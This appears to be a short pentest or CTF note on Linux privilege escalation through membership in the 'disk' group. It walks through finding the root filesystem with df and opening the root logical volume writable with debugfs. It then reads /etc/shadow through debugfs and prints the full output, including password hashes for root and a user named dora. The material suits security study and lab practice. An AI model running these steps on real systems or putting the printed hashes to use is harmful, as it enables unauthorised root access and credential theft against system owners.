
When an user belongs to the disk group, he most likely has read/write access to raw disk devices.
/dev/sd* /dev/dm-*

## PoC

We can utilize /dev/mapper/ubuntu--vg-ubuntu--lv & debugfs in order to elevate to root.

/dev/mapper/ubuntu--vg-ubuntu--lv is an logical volume containing the root filesystem.

## Syntax

1. Findout what's the root filesystem. --> /dev/sda2 in this case.

```
sysadmin@fanatastic:/$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  6.1G  3.3G  65% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop0       62M   62M     0 100% /snap/core20/1328
/dev/loop1       33M   33M     0 100% /snap/snapd/12883
/dev/loop3       56M   56M     0 100% /snap/core18/2128
/dev/loop6       71M   71M     0 100% /snap/lxd/21029
/dev/loop4       68M   68M     0 100% /snap/lxd/21835
/dev/loop2       44M   44M     0 100% /snap/snapd/14549
/dev/loop5       56M   56M     0 100% /snap/core18/2284
tmpfs            98M     0   98M   0% /run/user/1001
```

## Other Rootsystem but follow PoC

```
debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
```

Once in the filesystem:

```
debugfs: cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
daemon:*:19235:0:99999:7:::
bin:*:19235:0:99999:7:::
sys:*:19235:0:99999:7:::
sync:*:19235:0:99999:7:::
games:*:19235:0:99999:7:::
man:*:19235:0:99999:7:::
lp:*:19235:0:99999:7:::
mail:*:19235:0:99999:7:::
news:*:19235:0:99999:7:::
uucp:*:19235:0:99999:7:::
proxy:*:19235:0:99999:7:::
www-data:*:19235:0:99999:7:::
backup:*:19235:0:99999:7:::
list:*:19235:0:99999:7:::
irc:*:19235:0:99999:7:::
gnats:*:19235:0:99999:7:::
nobody:*:19235:0:99999:7:::
systemd-network:*:19235:0:99999:7:::
systemd-resolve:*:19235:0:99999:7:::
systemd-timesync:*:19235:0:99999:7:::
messagebus:*:19235:0:99999:7:::
syslog:*:19235:0:99999:7:::
_apt:*:19235:0:99999:7:::
tss:*:19235:0:99999:7:::
uuidd:*:19235:0:99999:7:::
tcpdump:*:19235:0:99999:7:::
landscape:*:19235:0:99999:7:::
pollinate:*:19235:0:99999:7:::
usbmux:*:19381:0:99999:7:::
sshd:*:19381:0:99999:7:::
systemd-coredump:!!:19381::::::
lxd:!:19381::::::
fwupd-refresh:*:19381:0:99999:7:::
dora:$6$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/:19453:0:99999:7:::
```